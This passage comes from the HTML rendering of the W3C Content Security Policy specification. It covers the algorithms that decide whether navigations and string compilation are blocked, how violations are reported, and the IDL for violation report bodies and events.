  "<code>Allowed</code>" when executed upon <var>element</var>, <var>type</var>, <var>policy</var> and <var>source</var>,
  skip to the next <var>directive</var>.</p>
         <li data-md>
          <p>Let <var>directive-name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
         <li data-md>
          <p>Otherwise, let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on the <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#current-settings-object" id="ref-for-current-settings-object">current settings
  object</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global⑤">global object</a>, <var>policy</var>,
  and <var>directive-name</var>.</p>
         <li data-md>
          <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource②">resource</a> to "<code>inline</code>".</p>
         <li data-md>
          <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-element" id="ref-for-violation-element">element</a> to <var>element</var>.</p>
         <li data-md>
          <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value①">value</a> <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-contain" id="ref-for-list-contain①">contains</a> the
  expression "<a data-link-type="grammar" href="#grammardef-report-sample" id="ref-for-grammardef-report-sample①"><code>'report-sample'</code></a>", then set <var>violation</var>’s <a data-link-type="dfn" href="#violation-sample" id="ref-for-violation-sample②">sample</a> to the substring of <var>source</var> containing its first 40
  characters.</p>
         <li data-md>
          <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on <var>violation</var>.</p>
         <li data-md>
          <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①①">disposition</a> is "<code>enforce</code>", then
  set <var>result</var> to "<code>Blocked</code>".</p>
        </ol>
      </ol>
     <li data-md>
      <p>Return <var>result</var>.</p>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should navigation request of type be blocked
    by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.2.5" data-lt="Should navigation request of type be blocked by Content Security Policy?" id="should-block-navigation-request"><span class="secno">4.2.5. </span><span class="content"> Should <var>navigation request</var> of <var>type</var> be blocked
    by Content Security Policy? </span><a class="self-link" href="#should-block-navigation-request" id="ref-for-should-block-navigation-request③"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①④">request</a> (<var>navigation request</var>) and a string (<var>type</var>, either
  "<code>form-submission</code>" or "<code>other</code>"), this algorithm return "<code>Blocked</code>" if the active policy blocks
  the navigation, and "<code>Allowed</code>" otherwise:</p>
    <ol class="algorithm">
     <li data-md>
      <p>Let <var>result</var> be "<code>Allowed</code>".</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client⑧">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global⑥">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑦">CSP list</a>:</p>
      <ol>
       <li data-md>
        <p>For each <var>directive</var> in <var>policy</var>:</p>
        <ol>
         <li data-md>
          <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-pre-navigation-check" id="ref-for-directive-pre-navigation-check">pre-navigation check</a> returns "<code>Allowed</code>" when executed upon <var>navigation request</var>, <var>type</var>, and <var>policy</var> skip to the next <var>directive</var>.</p>
         <li data-md>
          <p>Otherwise, let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client⑨">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global⑦">global object</a>, <var>policy</var>, and <var>directive</var>’s <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name③">name</a>.</p>
         <li data-md>
          <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource③">resource</a> to <var>navigation
  request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url" id="ref-for-concept-request-url②">URL</a>.</p>
         <li data-md>
          <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on <var>violation</var>.</p>
         <li data-md>
          <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①②">disposition</a> is "<code>enforce</code>", then
  set <var>result</var> to "<code>Blocked</code>".</p>
        </ol>
      </ol>
     <li data-md>
      <p>If <var>result</var> is "<code>Allowed</code>", and if <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-current-url" id="ref-for-concept-request-current-url①">current URL</a>’s <a data-link-type="dfn" href="https://url.spec.whatwg.org/#concept-url-scheme" id="ref-for-concept-url-scheme②">scheme</a> is <code>javascript</code>:</p>
      <ol>
       <li data-md>
        <p>For each <var>policy</var> in <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client①⓪">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global⑧">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑧">CSP list</a>:</p>
        <ol>
         <li data-md>
          <p>For each <var>directive</var> in <var>policy</var>:</p>
          <ol>
           <li data-md>
            <p>Let <var>directive-name</var> be the result of executing <a href="#effective-directive-for-inline-check">§ 6.7.2 Get the effective directive for inline checks</a> on <var>type</var>.</p>
           <li data-md>
            <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-inline-check" id="ref-for-directive-inline-check①">inline check</a> returns "<code>Allowed</code>" when executed upon <code>null</code>,
  "<code>navigation</code>" and <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-current-url" id="ref-for-concept-request-current-url②">current URL</a>,
  skip to the next <var>directive</var>.</p>
           <li data-md>
            <p>Otherwise, let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client①①">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global⑨">global object</a>, <var>policy</var>, and <var>directive-name</var>.</p>
           <li data-md>
            <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource④">resource</a> to <var>navigation
  request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url" id="ref-for-concept-request-url③">URL</a>.</p>
           <li data-md>
            <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on <var>violation</var>.</p>
           <li data-md>
            <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①③">disposition</a> is "<code>enforce</code>", then
  set <var>result</var> to "<code>Blocked</code>".</p>
          </ol>
        </ol>
      </ol>
     <li data-md>
      <p>Return <var>result</var>.</p>
    </ol>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="Should navigation response to navigation request of type
    in target be blocked by Content Security Policy?" data-dfn-type="dfn" data-export data-level="4.2.6" data-lt="Should navigation response to navigation request of type in target be blocked by Content Security Policy?" id="should-block-navigation-response"><span class="secno">4.2.6. </span><span class="content"> Should <var>navigation response</var> to <var>navigation request</var> of <var>type</var> in <var>target</var> be blocked by Content Security Policy? </span><a class="self-link" href="#should-block-navigation-response" id="ref-for-should-block-navigation-response②"></a></h4>
    <p>Given a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request①⑤">request</a> (<var>navigation request</var>), a string (<var>type</var>, either
  "<code>form-submission</code>" or "<code>other</code>"), a <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response" id="ref-for-concept-response①⑦">response</a> <var>navigation
  response</var>, and a <a data-link-type="dfn" href="https://html.spec.whatwg.org/#browsing-context" id="ref-for-browsing-context②">browsing context</a> <var>target</var>, this algorithm
  returns "<code>Blocked</code>" if the active policy blocks the navigation, and "<code>Allowed</code>"
  otherwise:</p>
    <ol class="algorithm">
     <li data-md>
      <p>Let <var>result</var> be "<code>Allowed</code>".</p>
     <li data-md>
      <p>For each <var>policy</var> in <var>navigation response</var>’s <a data-link-type="dfn">CSP list</a>:</p>
      <p class="note" role="note"><span class="marker">Note:</span> Some directives (like <a data-link-type="dfn" href="#frame-ancestors" id="ref-for-frame-ancestors">frame-ancestors</a>) allow a <var>response</var>’s <a data-link-type="dfn" href="#content-security-policy" id="ref-for-content-security-policy">Content Security Policy</a> to act on the navigation.</p>
      <ol>
       <li data-md>
        <p>For each <var>directive</var> in <var>policy</var>:</p>
        <ol>
         <li data-md>
          <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-navigation-response-check" id="ref-for-directive-navigation-response-check">navigation response check</a> returns "<code>Allowed</code>" when executed upon <var>navigation request</var>, <var>type</var>, <var>navigation response</var>, <var>target</var>, "<code>response</code>", and <var>policy</var> skip to the next <var>directive</var>.</p>
         <li data-md>
          <p>Otherwise, let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on <code>null</code>, <var>policy</var>, and <var>directive</var>’s <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name④">name</a>.</p>
          <p class="note" role="note"><span class="marker">Note:</span> We use <code>null</code> for the global object, as no global exists:
  we haven’t processed the navigation to create a Document yet.</p>
         <li data-md>
          <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource⑤">resource</a> to <var>navigation
  response</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url" id="ref-for-concept-response-url③">URL</a>.</p>
         <li data-md>
          <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on <var>violation</var>.</p>
         <li data-md>
          <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①④">disposition</a> is "<code>enforce</code>", then
  set <var>result</var> to "<code>Blocked</code>".</p>
        </ol>
      </ol>
     <li data-md>
      <p>For each <var>policy</var> in <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client①②">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global①⓪">global object</a>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list①⑨">CSP list</a>:</p>
      <p class="note" role="note"><span class="marker">Note:</span> Some directives in the <var>navigation request</var>’s context (like <a data-link-type="dfn" href="#navigate-to" id="ref-for-navigate-to①">navigate-to</a>)
  need the <var>response</var> before acting on the navigation.</p>
      <ol>
       <li data-md>
        <p>For each <var>directive</var> in <var>policy</var>:</p>
        <ol>
         <li data-md>
          <p>If <var>directive</var>’s <a data-link-type="dfn" href="#directive-navigation-response-check" id="ref-for-directive-navigation-response-check①">navigation response check</a> returns "<code>Allowed</code>" when executed upon <var>navigation request</var>, <var>type</var>, <var>navigation response</var>, <var>target</var>, "<code>source</code>", and <var>policy</var> skip to the next <var>directive</var>.</p>
         <li data-md>
          <p>Otherwise, let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on <var>navigation request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-client" id="ref-for-concept-request-client①③">client</a>’s <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-global" id="ref-for-concept-settings-object-global①①">global object</a>, <var>policy</var>, and <var>directive</var>’s <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name⑤">name</a>.</p>
         <li data-md>
          <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource⑥">resource</a> to <var>navigation
  request</var>’s <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-request-url" id="ref-for-concept-request-url④">URL</a>.</p>
         <li data-md>
          <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on <var>violation</var>.</p>
         <li data-md>
          <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①⑤">disposition</a> is "<code>enforce</code>", then
  set <var>result</var> to "<code>Blocked</code>".</p>
        </ol>
      </ol>
     <li data-md>
      <p>Return <var>result</var>.</p>
    </ol>
    <h3 class="heading settled" data-level="4.3" id="ecma-integration"><span class="secno">4.3. </span><span class="content">Integration with ECMAScript</span><a class="self-link" href="#ecma-integration"></a></h3>
    <p>ECMAScript defines a <code class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-hostensurecancompilestrings" id="ref-for-sec-hostensurecancompilestrings">HostEnsureCanCompileStrings()</a></code> abstract operation
  which allows the host environment to block the compilation of strings into
  ECMAScript code. This document defines an implementation of that abstract
  operation which examines the relevant <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②⓪">CSP list</a> to determine whether such compilation ought to be blocked.</p>
    <h4 class="heading settled dfn-paneled algorithm" data-algorithm="EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)" data-dfn-type="dfn" data-export data-level="4.3.1" data-lt="EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)" id="can-compile-strings"><span class="secno">4.3.1. </span><span class="content"> EnsureCSPDoesNotBlockStringCompilation(<var>callerRealm</var>, <var>calleeRealm</var>, <var>source</var>) </span><a class="self-link" href="#can-compile-strings" id="ref-for-can-compile-strings"></a></h4>
    <p>Given two <a data-link-type="dfn" href="https://tc39.github.io/ecma262#realm" id="ref-for-realm">realms</a> (<var>callerRealm</var> and <var>calleeRealm</var>), and a string (<var>source</var>), this algorithm
  returns normally if string compilation is allowed, and throws an "<code>EvalError</code>" if not:</p>
    <ol>
     <li data-md>
      <p>Let <var>globals</var> be a list containing <var>callerRealm</var>’s <a data-link-type="dfn">global object</a> and <var>calleeRealm</var>’s <a data-link-type="dfn">global object</a>.</p>
     <li data-md>
      <p>For each <var>global</var> in <var>globals</var>:</p>
      <ol>
       <li data-md>
        <p>Let <var>result</var> be "<code>Allowed</code>".</p>
       <li data-md>
        <p>For each <var>policy</var> in <var>global</var>’s <a data-link-type="dfn" href="#global-object-csp-list" id="ref-for-global-object-csp-list②①">CSP list</a>:</p>
        <ol>
         <li data-md>
          <p>Let <var>source-list</var> be <code>null</code>.</p>
         <li data-md>
          <p>If <var>policy</var> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives⑧">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name⑥">name</a> is "<code>script-src</code>", then
  set <var>source-list</var> to that <a data-link-type="dfn" href="#directives" id="ref-for-directives⑨">directive</a>'s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②">value</a>.</p>
          <p>Otherwise if <var>policy</var> contains a <a data-link-type="dfn" href="#directives" id="ref-for-directives①⓪">directive</a> whose <a data-link-type="dfn" href="#directive-name" id="ref-for-directive-name⑦">name</a> is
  "<code>default-src</code>", then set <var>source-list</var> to that directive’s <a data-link-type="dfn" href="#directive-value" id="ref-for-directive-value③">value</a>.</p>
         <li data-md>
          <p>If <var>source-list</var> is not <code>null</code>, and does not contain a <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression②">source expression</a> which is
  an <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-case-insensitive" id="ref-for-ascii-case-insensitive①">ASCII case-insensitive</a> match for the string "<a data-link-type="grammar" href="#grammardef-unsafe-eval" id="ref-for-grammardef-unsafe-eval"><code>'unsafe-eval'</code></a>",
  then:</p>
          <ol>
           <li data-md>
            <p>Let <var>violation</var> be the result of executing <a href="#create-violation-for-global">§ 2.4.1 Create a violation object for global, policy, and directive</a> on <var>global</var>, <var>policy</var>, and "<code>script-src</code>".</p>
           <li data-md>
            <p>Set <var>violation</var>’s <a data-link-type="dfn" href="#violation-resource" id="ref-for-violation-resource⑦">resource</a> to "<code>inline</code>".</p>
           <li data-md>
            <p>If <var>source-list</var> <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-contain" id="ref-for-list-contain②">contains</a> the expression
  "<a data-link-type="grammar" href="#grammardef-report-sample" id="ref-for-grammardef-report-sample②"><code>'report-sample'</code></a>", then set <var>violation</var>’s <a data-link-type="dfn" href="#violation-sample" id="ref-for-violation-sample③">sample</a> to
  the substring of <var>source</var> containing its first 40 characters.</p>
           <li data-md>
            <p>Execute <a href="#report-violation">§ 5.3 Report a violation</a> on <var>violation</var>.</p>
           <li data-md>
            <p>If <var>policy</var>’s <a data-link-type="dfn" href="#policy-disposition" id="ref-for-policy-disposition①⑥">disposition</a> is "<code>enforce</code>", then set <var>result</var> to
  "<code>Blocked</code>".</p>
          </ol>
        </ol>
       <li data-md>
        <p>If <var>result</var> is "<code>Blocked</code>", throw an <code>EvalError</code> exception.</p>
      </ol>
    </ol>
    <p class="issue" id="issue-d5a07bef"><a class="self-link" href="#issue-d5a07bef"></a> <code class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-hostensurecancompilestrings" id="ref-for-sec-hostensurecancompilestrings①">HostEnsureCanCompileStrings()</a></code> does not include the string which is
  going to be compiled as a parameter. We’ll also need to update HTML to pipe that value through
  to CSP. <a href="https://github.com/tc39/ecma262/issues/938">[Issue #tc39/ecma262#938]</a></p>
   </section>
   <section>
    <h2 class="heading settled" data-level="5" id="reporting"><span class="secno">5. </span><span class="content"> Reporting </span><a class="self-link" href="#reporting"></a></h2>
    <p>When one or more of a <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object②⑨">policy</a>’s directives is violated,
  a <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="csp-violation-report">csp violation report</dfn> may be generated and sent out to a
  reporting endpoint associated with the <a data-link-type="dfn" href="#content-security-policy-object" id="ref-for-content-security-policy-object③⓪">policy</a>.</p>
    <p><a data-link-type="dfn" href="#csp-violation-report" id="ref-for-csp-violation-report">csp violation reports</a> have the <a data-link-type="dfn" href="https://w3c.github.io/reporting/#report-type" id="ref-for-report-type">report type</a> "csp-violation".</p>
    <p><a data-link-type="dfn" href="#csp-violation-report" id="ref-for-csp-violation-report①">csp violation reports</a> are <a data-link-type="dfn" href="https://w3c.github.io/reporting/#visible-to-reportingobservers" id="ref-for-visible-to-reportingobservers">visible to <code>ReportingObserver</code>s</a>. </p>
<pre class="idl highlight def">[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed" id="ref-for-Exposed"><c- g>Exposed</c-></a>=<c- n>Window</c->]
<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="cspviolationreportbody"><code><c- g>CSPViolationReportBody</c-></code></dfn> : <a data-link-type="idl-name" href="https://www.w3.org/TR/reporting-1/#reportbody" id="ref-for-reportbody"><c- n>ReportBody</c-></a> {
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString"><c- b>USVString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-cspviolationreportbody-documenturl"><code><c- g>documentURL</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString①"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-referrer"><code><c- g>referrer</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString②"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-blockedurl"><code><c- g>blockedURL</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString"><c- b>DOMString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-cspviolationreportbody-effectivedirective"><code><c- g>effectiveDirective</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString①"><c- b>DOMString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString" id="dom-cspviolationreportbody-originalpolicy"><code><c- g>originalPolicy</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString③"><c- b>USVString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="USVString?" id="dom-cspviolationreportbody-sourcefile"><code><c- g>sourceFile</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString②"><c- b>DOMString</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="DOMString?" id="dom-cspviolationreportbody-sample"><code><c- g>sample</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a data-link-type="idl-name" href="#enumdef-securitypolicyviolationeventdisposition" id="ref-for-enumdef-securitypolicyviolationeventdisposition"><c- n>SecurityPolicyViolationEventDisposition</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="SecurityPolicyViolationEventDisposition" id="dom-cspviolationreportbody-disposition"><code><c- g>disposition</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-short" id="ref-for-idl-unsigned-short"><c- b>unsigned</c-> <c- b>short</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned short" id="dom-cspviolationreportbody-statuscode"><code><c- g>statusCode</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long"><c- b>unsigned</c-> <c- b>long</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long?" id="dom-cspviolationreportbody-linenumber"><code><c- g>lineNumber</c-></code></dfn>;
  <c- b>readonly</c-> <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-unsigned-long" id="ref-for-idl-unsigned-long①"><c- b>unsigned</c-> <c- b>long</c-></a>? <dfn class="dfn-paneled idl-code" data-dfn-for="CSPViolationReportBody" data-dfn-type="attribute" data-export data-readonly data-type="unsigned long?" id="dom-cspviolationreportbody-columnnumber"><code><c- g>columnNumber</c-></code></dfn>;
};
</pre>
    <h3 class="heading settled" data-level="5.1" id="violation-events"><span class="secno">5.1. </span><span class="content"> Violation DOM Events </span><a class="self-link" href="#violation-events"></a></h3>
<pre class="idl highlight def"><c- b>enum</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="enum" data-export id="enumdef-securitypolicyviolationeventdisposition"><code><c- g>SecurityPolicyViolationEventDisposition</c-></code></dfn> {
  <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventDisposition" data-dfn-type="enum-value" data-export id="dom-securitypolicyviolationeventdisposition-enforce"><code><c- s>"enforce"</c-></code></dfn>, <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEventDisposition" data-dfn-type="enum-value" data-export id="dom-securitypolicyviolationeventdisposition-report"><code><c- s>"report"</c-></code></dfn>
};

[<a class="idl-code" data-link-type="extended-attribute" href="https://webidl.spec.whatwg.org/#Exposed" id="ref-for-Exposed①"><c- g>Exposed</c-></a>=(<c- n>Window</c->,<c- n>Worker</c->)]
<c- b>interface</c-> <dfn class="dfn-paneled idl-code" data-dfn-type="interface" data-export id="securitypolicyviolationevent"><code><c- g>SecurityPolicyViolationEvent</c-></code></dfn> : <a data-link-type="idl-name" href="https://dom.spec.whatwg.org/#event" id="ref-for-event"><c- n>Event</c-></a> {
    <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="constructor" data-export data-lt="SecurityPolicyViolationEvent(type, eventInitDict)|constructor(type, eventInitDict)|SecurityPolicyViolationEvent(type)|constructor(type)" id="dom-securitypolicyviolationevent-securitypolicyviolationevent"><code><c- g>constructor</c-></code></dfn>(<a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-DOMString" id="ref-for-idl-DOMString③"><c- b>DOMString</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-type"><code><c- g>type</c-></code></dfn>, <c- b>optional</c-> <a data-link-type="idl-name" href="#dictdef-securitypolicyviolationeventinit" id="ref-for-dictdef-securitypolicyviolationeventinit"><c- n>SecurityPolicyViolationEventInit</c-></a> <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type, eventInitDict), SecurityPolicyViolationEvent/constructor(type, eventInitDict), SecurityPolicyViolationEvent/SecurityPolicyViolationEvent(type), SecurityPolicyViolationEvent/constructor(type)" data-dfn-type="argument" data-export id="dom-securitypolicyviolationevent-securitypolicyviolationevent-type-eventinitdict-eventinitdict"><code><c- g>eventInitDict</c-></code></dfn> = {});
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString④"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-documenturl"><code><c- g>documentURL</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑤"><c- b>USVString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-documenturi" id="ref-for-dom-securitypolicyviolationevent-documenturi"><c- g>documentURI</c-></a>; // historical alias of documentURL
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑥"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-referrer"><code><c- g>referrer</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑦"><c- b>USVString</c-></a>      <dfn class="dfn-paneled idl-code" data-dfn-for="SecurityPolicyViolationEvent" data-dfn-type="attribute" data-export data-readonly data-type="USVString" id="dom-securitypolicyviolationevent-blockedurl"><code><c- g>blockedURL</c-></code></dfn>;
    <c- b>readonly</c->    <c- b>attribute</c-> <a class="idl-code" data-link-type="interface" href="https://webidl.spec.whatwg.org/#idl-USVString" id="ref-for-idl-USVString⑧"><c- b>USVString</c-></a>      <a class="idl-code" data-link-type="attribute" data-readonly data-type="USVString" href="#dom-securitypolicyviolationevent-blockeduri" id="ref-for-dom-securitypolicyviolationevent-blockeduri"><c- g>blockedURI</c-></a>; // historical alias of blockedURL
